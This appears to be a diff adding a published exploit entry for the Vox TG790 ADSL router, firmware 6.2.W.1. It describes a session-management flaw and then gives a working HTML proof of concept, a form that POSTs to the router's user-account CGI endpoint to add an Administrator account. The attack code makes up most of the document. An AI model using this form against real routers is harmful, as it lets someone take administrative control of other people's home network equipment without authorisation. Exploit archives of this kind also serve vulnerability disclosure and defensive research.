@@ -1,0 +1,27 @@
+# Title: Vox TG790 ADSL Router - Cross-Site Request Forgery (Add Admin)
+# Author: Cakes
+# Exploit Date: 2018-08-01
+# Vendor: Vox Telecom
+# Link: https://www.vox.co.za/
+# Firmware Version: 6.2.W.1
+# CVE: N/A
+
+# Description
+# Due to improper session management low privilege users are able to create 
+# administrator accounts through a crafted POST request. 
+
+# PoC
+
+<html>
+<form action="https://TARGET/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9&tid=ADD_USER" method="POST">
+<input type="hidden" name="0" id="0" value="10">
+<input type="hidden" name="1" id="1" value="usrAccApply">
+<input type="hidden" name="34" id="34" value="LulzCakes">
+<input type="hidden" name="36" id="36" value="1">
+<input type="text" name="33" id="33" placeholder="Account Name">
+<br />
+<input type="text" name="31" id="31" value="Administrator">
+<br />
+<input type="submit" value="W00ts">
+</form>
+</html>
